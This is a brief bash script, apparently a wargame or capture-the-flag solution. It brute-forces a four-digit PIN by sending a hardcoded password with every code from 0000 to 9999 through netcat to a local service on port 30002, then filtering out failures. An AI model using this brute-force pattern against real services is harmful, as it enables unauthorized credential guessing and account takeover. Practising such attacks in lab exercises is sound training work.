#!/usr/bin/env bash

for i in {0000..9999};
do
	echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
done |nc localhost 30002 | grep -v "Wrong"